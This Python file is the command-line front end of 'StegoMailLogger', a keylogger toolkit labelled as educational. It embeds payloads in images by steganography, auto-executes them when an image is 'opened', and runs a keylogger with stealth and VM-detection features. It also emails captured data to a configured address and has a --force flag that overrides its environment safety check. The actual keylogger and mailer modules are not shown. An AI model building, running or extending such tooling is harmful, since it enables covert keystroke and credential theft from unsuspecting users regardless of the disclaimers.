#!/usr/bin/env python3
"""
StegoMailLogger - Educational Steganographic Keylogger Project
Main CLI interface for encoding, decoding, and executing steganographic payloads.

Author: Educational Cybersecurity Project
Warning: For educational use only in controlled environments.
"""

import argparse
import os
import sys
import logging
from datetime import datetime

# Import project modules
from steg.encoder import StegoEncoder
from steg.decoder import StegoDecoder
from trigger.opener import StegoImageOpener
from logger.keylogger import StegoKeylogger
from logger.mailer import StegoMailer
from utils.encryptor import PayloadEncryptor

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class StegoMailLoggerCLI:
    """
    Command-line interface for the StegoMailLogger project.
    """
    
    def __init__(self):
        """Initialize the CLI."""
        self.config_path = "config.json"
        
    def print_banner(self):
        """Print project banner and disclaimer."""
        banner = """
╔═══════════════════════════════════════════════════════════════╗
║                    STEGOMAILLOGGER v1.0                      ║
║              Educational Steganography Project               ║
╠═══════════════════════════════════════════════════════════════╣
║                                                               ║
║  🔒 EDUCATIONAL PURPOSE ONLY - CONTROLLED ENVIRONMENT USE    ║
║  ⚠️  THIS SOFTWARE IS FOR CYBERSECURITY LEARNING ONLY       ║
║  📚 NOT FOR MALICIOUS USE OR PRODUCTION DEPLOYMENT          ║
║                                                               ║
║  Features:                                                    ║
║  • Steganographic payload embedding/extraction               ║
║  • Educational keylogger demonstration                        ║
║  • Email transmission via SMTP                               ║
║  • Image-triggered payload execution simulation              ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
"""
        print(banner)
        
    def encode_payload(self, args):
        """
        Encode payload into image using steganography.
        
        Args:
            args: Command line arguments
            
        Returns:
            bool: True if encoding successful
        """
        try:
            logger.info("=== PAYLOAD ENCODING ===")
            logger.info(f"Payload file: {args.payload}")
            logger.info(f"Cover image: {args.image}")
            logger.info(f"Output image: {args.output}")
            
            # Validate input files
            if not os.path.exists(args.payload):
                logger.error(f"Payload file not found: {args.payload}")
                return False
                
            if not os.path.exists(args.image):
                logger.error(f"Cover image not found: {args.image}")
                return False
            
            # Initialize encoder
            encoder = StegoEncoder(self.config_path)
            
            # Perform encoding
            success = encoder.embed_payload(args.payload, args.image, args.output)
            
            if success:
                logger.info("Payload encoding completed successfully!")
                logger.info(f"Steganographic image saved: {args.output}")
                
                # Show file sizes for comparison
                original_size = os.path.getsize(args.image)
                stego_size = os.path.getsize(args.output)
                payload_size = os.path.getsize(args.payload)
                
                print(f"\nFile Size Comparison:")
                print(f"  Original image: {original_size:,} bytes")
                print(f"  Steganographic image: {stego_size:,} bytes")
                print(f"  Payload: {payload_size:,} bytes")
                print(f"  Size difference: {stego_size - original_size:,} bytes")
                
                return True
            else:
                logger.error("Payload encoding failed!")
                return False
                
        except Exception as e:
            logger.error(f"Encoding process failed: {e}")
            return False
    
    def decode_payload(self, args):
        """
        Decode payload from steganographic image.
        
        Args:
            args: Command line arguments
            
        Returns:
            bool: True if decoding successful
        """
        try:
            logger.info("=== PAYLOAD DECODING ===")
            logger.info(f"Steganographic image: {args.image}")
            
            if args.output:
                logger.info(f"Output file: {args.output}")
            
            # Validate input file
            if not os.path.exists(args.image):
                logger.error(f"Steganographic image not found: {args.image}")
                return False
            
            # Initialize decoder
            decoder = StegoDecoder(self.config_path)
            
            # Analyze image first
            logger.info("Analyzing image for steganographic content...")
            analysis = decoder.analyze_image(args.image)
            
            print(f"\nImage Analysis:")
            print(f"  File size: {analysis.get('file_size', 0):,} bytes")
            print(f"  Format: {analysis.get('image_format', 'Unknown')}")
            print(f"  Dimensions: {analysis.get('image_size', 'Unknown')}")
            print(f"  Estimated capacity: {analysis.get('estimated_capacity', 0):,} bytes")
            print(f"  Contains StegoMail payload: {analysis.get('has_stegomail_markers', False)}")
            
            if not analysis.get('has_stegomail_markers', False):
                logger.warning("No StegoMail payload markers detected in image")
                print("\nNote: This may be a normal image or use different steganography")
            
            # Extract payload
            success, payload_content, metadata = decoder.extract_payload(args.image, args.output)
            
            if success and payload_content:
                logger.info("Payload extraction completed successfully!")
                
                print(f"\nExtracted Payload:")
                print(f"  Size: {len(payload_content):,} characters")
                
                if metadata:
                    print(f"  Type: {metadata.get('type', 'Unknown')}")
                    print(f"  Version: {metadata.get('version', 'Unknown')}")
                    print(f"  Encryption: {metadata.get('encryption', 'Unknown')}")
                
                if args.output:
                    print(f"  Saved to: {args.output}")
                
                # Show payload preview (first 200 characters)
                if not args.quiet:
                    print(f"\nPayload Preview:")
                    print("-" * 60)
                    print(payload_content[:200] + ("..." if len(payload_content) > 200 else ""))
                    print("-" * 60)
                
                return True
            else:
                logger.error("Payload extraction failed!")
                return False
                
        except Exception as e:
            logger.error(f"Decoding process failed: {e}")
            return False
    
    def simulate_open(self, args):
        """
        Simulate opening an image and executing embedded payload.
        
        Args:
            args: Command line arguments
            
        Returns:
            bool: True if simulation successful
        """
        try:
            logger.info("=== IMAGE OPENING SIMULATION ===")
            logger.info(f"Image file: {args.image}")
            
            # Validate input file
            if not os.path.exists(args.image):
                logger.error(f"Image file not found: {args.image}")
                return False
            
            # Initialize opener
            opener = StegoImageOpener(self.config_path)
            
            # Configure opener settings
            opener.display_image = not args.no_display
            opener.auto_execute = not args.no_execute
            
            # Environment safety check
            logger.info("Performing environment safety check...")
            env_check = opener.check_environment()
            
            print(f"\nEnvironment Check:")
            print(f"  Platform: {env_check.get('platform', 'Unknown')}")
            print(f"  Hostname: {env_check.get('hostname', 'Unknown')}")
            print(f"  User: {env_check.get('user', 'Unknown')}")
            print(f"  Virtual environment: {env_check.get('is_virtual', False)}")
            print(f"  Safe to run: {env_check.get('safe_to_run', False)}")
            
            if not env_check.get('safe_to_run', False):
                logger.warning("Environment safety check failed!")
                logger.warning("Execution may be blocked for safety reasons")
                
                if not args.force:
                    print("\nUse --force to override safety check (educational use only)")
                    return False
                else:
                    logger.warning("Safety check overridden with --force flag")
            
            # Simulate image opening
            success = opener.simulate_image_open(args.image, show_image=not args.no_display)
            
            if success:
                logger.info("Image opening simulation completed successfully!")
                return True
            else:
                logger.error("Image opening simulation failed!")
                return False
                
        except Exception as e:
            logger.error(f"Simulation failed: {e}")
            return False
    
    def run_keylogger(self, args):
        """
        Run standalone keylogger for testing.
        
        Args:
            args: Command line arguments
            
        Returns:
            bool: True if keylogger runs successfully
        """
        try:
            logger.info("=== STANDALONE KEYLOGGER ===")
            logger.info("Starting educational keylogger for testing...")
            
            # Initialize keylogger
            keylogger = StegoKeylogger(self.config_path)
            
            # Show system information
            system_info = keylogger.get_system_info()
            print(f"\nSystem Information:")
            for key, value in system_info.items():
                print(f"  {key}: {value}")
            
            # Check VM environment
            is_vm = keylogger.check_vm_environment()
            print(f"\nVM Environment Detected: {is_vm}")
            
            if not is_vm:
                logger.warning("Not running in VM - this is for educational purposes only!")
            
            # Configure duration
            duration = args.duration if hasattr(args, 'duration') and args.duration else 30
            
            logger.info(f"Running keylogger for {duration} seconds...")
            print(f"\nKeylogger will run for {duration} seconds")
            print("Type some text to test keystroke capture")
            print("Press ESC to stop early (if not in stealth mode)")
            
            # Start keylogger
            keylogger.start_logging(duration=duration)
            
            logger.info("Keylogger session completed")
            return True
            
        except Exception as e:
            logger.error(f"Keylogger execution failed: {e}")
            return False
    
    def test_email(self, args):
        """
        Test email functionality.
        
        Args:
            args: Command line arguments
            
        Returns:
            bool: True if email test successful
        """
        try:
            logger.info("=== EMAIL FUNCTIONALITY TEST ===")
            
            # Initialize mailer
            mailer = StegoMailer(self.config_path)
            
            # Show configuration
            config = mailer.config.get('email', {})
            print(f"\nEmail Configuration:")
            print(f"  SMTP Server: {config.get('smtp_server', 'Not configured')}")
            print(f"  SMTP Port: {config.get('smtp_port', 'Not configured')}")
            print(f"  Username: {config.get('username', 'Not configured')}")
            print(f"  Target Email: {config.get('target_email', 'Not configured')}")
            
            # Show supported providers
            providers = mailer.get_supported_providers()
            print(f"\nSupported Email Providers:")
            for name, provider_config in providers.items():
                print(f"  {name}:")
                print(f"    Server: {provider_config['smtp_server']}:{provider_config['smtp_port']}")
                print(f"    Notes: {provider_config['notes']}")
            
            # Test email sending if credentials are configured
            if all([config.get('username'), config.get('password'), config.get('target_email')]):
                logger.info("Testing email transmission...")
                success = mailer.send_test_email()
                
                if success:
                    logger.info("Test email sent successfully!")
                    return True
                else:
                    logger.error("Test email failed!")
                    return False
            else:
                logger.warning("Email credentials not fully configured")
                print("\nTo test email sending, configure credentials in config.json or .env file")
                return True
                
        except Exception as e:
            logger.error(f"Email test failed: {e}")
            return False
    
    def create_samples(self, args):
        """
        Create sample files for testing.
        
        Args:
            args: Command line arguments
            
        Returns:
            bool: True if samples created successfully
        """
        try:
            logger.info("=== CREATING SAMPLE FILES ===")
            
            # Initialize encoder for sample creation
            encoder = StegoEncoder(self.config_path)
            
            # Create sample payload
            print("1. Creating sample keylogger payload...")
            payload_created = encoder.create_sample_payload("sample_keylogger.py")
            
            # Create sample cover image
            print("2. Creating sample cover image...")
            image_created = encoder.create_sample_image("sample_cover.png")
            
            # Create enhanced keylogger payload
            print("3. Creating enhanced keylogger payload...")
            enhanced_payload = self.create_enhanced_payload()
            
            if payload_created and image_created and enhanced_payload:
                logger.info("Sample files created successfully!")
                
                print(f"\nCreated Files:")
                print(f"  sample_keylogger.py - Basic educational payload")
                print(f"  enhanced_keylogger.py - Enhanced educational payload")
                print(f"  sample_cover.png - Cover image for steganography")
                
                print(f"\nNext Steps:")
                print(f"  1. Encode payload: python main.py encode --payload sample_keylogger.py --image sample_cover.png --output stego_image.png")
                print(f"  2. Test decoding: python main.py decode --image stego_image.png")
                print(f"  3. Simulate opening: python main.py open --image stego_image.png")
                
                return True
            else:
                logger.error("Failed to create some sample files")
                return False
                
        except Exception as e:
            logger.error(f"Sample creation failed: {e}")
            return False
    
    def create_enhanced_payload(self):
        """
        Create an enhanced keylogger payload that includes email functionality.
        
        Returns:
            bool: True if payload created successfully
        """
        enhanced_payload = '''#!/usr/bin/env python3
"""
Enhanced educational keylogger payload with email functionality.
Demonstrates steganographic payload with network communication.
"""

import os
import sys
import time
import json
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def enhanced_educational_payload():
    """
    Enhanced educational keylogger demonstration.
    Includes simulated email functionality and system enumeration.
    """
    logger.info("=== ENHANCED EDUCATIONAL PAYLOAD ===")
    logger.info("Steganographic payload execution demonstration")
    logger.info(f"Timestamp: {datetime.now()}")
    
    # System enumeration
    system_info = {
        "execution_time": datetime.now().isoformat(),
        "platform": sys.platform,
        "python_version": sys.version,
        "working_directory": os.getcwd(),
        "environment_variables": len(os.environ),
        "user": os.environ.get("USER", os.environ.get("USERNAME", "Unknown"))
    }
    
    logger.info("System Enumeration:")
    for key, value in system_info.items():
        logger.info(f"  {key}: {value}")
    
    # Simulate keylogger initialization
    logger.info("Initializing educational keylogger components...")
    
    # Simulate keystroke capture (educational purposes)
    sample_keystrokes = [
        "password123",
        "admin",
        "secret_document.txt",
        "confidential_data"
    ]
    
    logger.info("Simulated keystroke capture:")
    for i, keystroke in enumerate(sample_keystrokes):
        time.sleep(0.5)
        logger.info(f"  [{i+1}] Captured: {keystroke}")
    
    # Simulate email transmission
    logger.info("Simulating email transmission...")
    
    email_data = {
        "subject": "Educational Payload Report",
        "timestamp": datetime.now().isoformat(),
        "system_info": system_info,
        "captured_keystrokes": sample_keystrokes,
        "note": "This is an educational demonstration only"
    }
    
    logger.info("Email payload prepared:")
    logger.info(f"  Size: {len(str(email_data))} characters")
    logger.info(f"  Keystrokes captured: {len(sample_keystrokes)}")
    
    # Simulate stealth operations
    logger.info("Simulating stealth operations...")
    time.sleep(2)
    
    logger.info("Educational payload execution completed")
    logger.info("Note: This is a demonstration for cybersecurity learning")
    logger.info("=== END ENHANCED PAYLOAD ===")
    
    return True

# Auto-execution
if __name__ == "__main__":
    try:
        enhanced_educational_payload()
    except Exception as e:
        logger.error(f"Payload execution error: {e}")
'''
        
        try:
            with open("enhanced_keylogger.py", 'w') as f:
                f.write(enhanced_payload)
            logger.info("Enhanced payload created: enhanced_keylogger.py")
            return True
        except Exception as e:
            logger.error(f"Failed to create enhanced payload: {e}")
            return False
    
    def setup_parser(self):
        """
        Set up command line argument parser.
        
        Returns:
            argparse.ArgumentParser: Configured parser
        """
        parser = argparse.ArgumentParser(
            description="StegoMailLogger - Educational Steganographic Keylogger",
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
Examples:
  # Create sample files
  python main.py samples
  
  # Encode keylogger into image
  python main.py encode --payload keylogger.py --image cover.png --output stego.png
  
  # Decode payload from image
  python main.py decode --image stego.png --output extracted_payload.py
  
  # Simulate opening steganographic image
  python main.py open --image stego.png
  
  # Test keylogger functionality
  python main.py keylogger --duration 30
  
  # Test email functionality
  python main.py email-test

Note: This software is for educational cybersecurity purposes only.
Use only in controlled environments for learning about steganography.
            """
        )
        
        # Create subparsers
        subparsers = parser.add_subparsers(dest='command', help='Available commands')
        
        # Encode command
        encode_parser = subparsers.add_parser('encode', help='Embed payload into image')
        encode_parser.add_argument('--payload', required=True, help='Path to payload file')
        encode_parser.add_argument('--image', required=True, help='Path to cover image')
        encode_parser.add_argument('--output', required=True, help='Path for output stego image')
        
        # Decode command
        decode_parser = subparsers.add_parser('decode', help='Extract payload from image')
        decode_parser.add_argument('--image', required=True, help='Path to steganographic image')
        decode_parser.add_argument('--output', help='Path to save extracted payload')
        decode_parser.add_argument('--quiet', action='store_true', help='Suppress payload preview')
        
        # Open command
        open_parser = subparsers.add_parser('open', help='Simulate opening steganographic image')
        open_parser.add_argument('--image', required=True, help='Path to steganographic image')
        open_parser.add_argument('--no-display', action='store_true', help='Don\'t display image')
        open_parser.add_argument('--no-execute', action='store_true', help='Don\'t execute payload')
        open_parser.add_argument('--force', action='store_true', help='Override safety checks')
        
        # Keylogger command
        keylogger_parser = subparsers.add_parser('keylogger', help='Run standalone keylogger test')
        keylogger_parser.add_argument('--duration', type=int, default=30, help='Duration in seconds')
        
        # Email test command
        subparsers.add_parser('email-test', help='Test email functionality')
        
        # Samples command
        subparsers.add_parser('samples', help='Create sample files for testing')
        
        return parser
    
    def run(self):
        """
        Main entry point for the CLI application.
        """
        # Print banner
        self.print_banner()
        
        # Setup argument parser
        parser = self.setup_parser()
        args = parser.parse_args()
        
        # Handle commands
        if not args.command:
            parser.print_help()
            return 1
        
        try:
            # Dispatch to appropriate handler
            if args.command == 'encode':
                success = self.encode_payload(args)
            elif args.command == 'decode':
                success = self.decode_payload(args)
            elif args.command == 'open':
                success = self.simulate_open(args)
            elif args.command == 'keylogger':
                success = self.run_keylogger(args)
            elif args.command == 'email-test':
                success = self.test_email(args)
            elif args.command == 'samples':
                success = self.create_samples(args)
            else:
                logger.error(f"Unknown command: {args.command}")
                parser.print_help()
                return 1
            
            # Return appropriate exit code
            return 0 if success else 1
            
        except KeyboardInterrupt:
            logger.info("Operation interrupted by user")
            return 1
        except Exception as e:
            logger.error(f"Unexpected error: {e}")
            return 1


def main():
    """Entry point for the application."""
    cli = StegoMailLoggerCLI()
    return cli.run()


if __name__ == "__main__":
    sys.exit(main())